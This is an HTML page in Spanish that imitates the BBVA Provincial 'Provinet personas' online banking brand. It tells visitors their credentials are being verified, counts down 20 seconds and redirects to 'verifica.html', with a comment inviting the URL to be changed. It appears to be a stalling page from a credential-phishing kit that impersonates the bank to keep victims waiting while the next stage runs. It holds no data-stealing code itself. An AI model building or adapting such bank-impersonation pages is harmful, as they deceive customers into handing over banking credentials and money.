<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Verificando Credenciales</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
    }

    .header {
      background-color: #052146;
      color: white;
      padding: 20px;
    }

    .header h1 {
      margin: 0;
      font-size: 24px;
      font-weight: bold;
    }

    .header span {
      display: block;
      margin-top: 5px;
      font-size: 14px;
      color: #b5d0ff;
    }

    .content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: calc(100vh - 90px);
      text-align: center;
    }

    .spinner {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #4188F3;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-bottom: 20px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .message {
      font-size: 18px;
      font-weight: bold;
      color: #444;
    }

    .subtext {
      color: #777;
      margin-top: 8px;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <div class="header">
    <h1>BBVA <span style="font-weight: normal;">Provincial</span></h1>
    <span>Acceso Provinet personas</span>
  </div>

  <div class="content">
    <div class="spinner"></div>
    <div class="message">Espere <span id="counter">20</span> segundos</div>
    <div class="subtext">No cierre esta pantalla, estamos verificando sus credenciales.</div>
  </div>

  <script>
    let counter = 20;
    const counterElement = document.getElementById("counter");
    const interval = setInterval(() => {
      counter--;
      if (counter <= 0) {
        clearInterval(interval);
        counterElement.textContent = "0";
        window.location.href = "verifica.html"; // ← Cambia esta URL si lo deseas
      } else {
        counterElement.textContent = counter;
      }
    }, 1000);
  </script>

</body>
</html>
